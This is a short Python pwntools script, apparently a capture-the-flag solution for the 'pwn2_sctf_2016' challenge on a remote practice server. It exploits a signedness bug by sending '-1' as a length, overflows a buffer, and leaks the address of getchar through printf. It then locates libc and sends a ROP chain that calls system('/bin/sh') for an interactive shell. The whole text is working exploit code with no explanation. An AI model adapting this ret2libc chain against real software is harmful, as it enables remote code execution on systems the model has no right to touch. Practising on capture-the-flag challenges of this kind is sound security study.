from pwn import *
from LibcSearcher import *

context.arch = 'i386'
elf = ELF("./pwn2_sctf_2016")
vuln_addr = 0x804852F
r = remote("node3.buuoj.cn", 28031)
r.recvuntil("read? ")
r.sendline("-1")
r.recvline()
r.sendline('a' * 0x30 + flat([elf.plt["printf"], vuln_addr, elf.got["getchar"]]))
r.recvline()
getchar_addr = u32(r.recv(4))
libc = LibcSearcher("getchar", getchar_addr)
libc_base = getchar_addr - libc.dump("getchar")
system_addr = libc_base + libc.dump("system")
bin_sh_addr = libc_base + libc.dump("str_bin_sh")
exit_addr = libc_base + libc.dump("exit")
r.recvuntil("read? ")
r.sendline("-1")
r.recvline()
r.sendline('a' * 0x30 + flat([system_addr, exit_addr, bin_sh_addr]))
r.recvline()
r.interactive()
